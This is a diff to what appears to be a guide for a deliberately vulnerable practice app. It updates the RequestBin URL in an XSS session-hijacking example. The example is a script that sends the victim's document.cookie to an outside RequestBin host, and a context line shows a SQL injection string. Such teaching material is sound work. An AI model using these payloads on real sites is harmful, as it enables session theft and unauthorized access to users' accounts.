@@ -69,12 +69,12 @@ foo' or '1'='1
 ```
 
 ### Session Hijacking (XSS)
-Using a service like [RequestBin](https://requestb.in/) it's possible to hijack user sessions by capturing their session cookie. Try sending a message to a user consisting of the following code (with `{{ bin_id }}` substituted out for your RequestBin bin ID).
+Using a service like [RequestBin](https://requestbin.fullcontact.com/) it's possible to hijack user sessions by capturing their session cookie. Try sending a message to a user consisting of the following code (with `{{ bin_id }}` substituted out for your RequestBin bin ID).
 
 ```html
 <script>
     var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("GET", "https://requestb.in/{{ bin_id }}?c=" + document.cookie, false);
+    xmlHttp.open("GET", "http://requestbin.fullcontact.com/{{ bin_id }}?c=" + document.cookie, false);
     xmlHttp.send(null);
 </script>
 ```
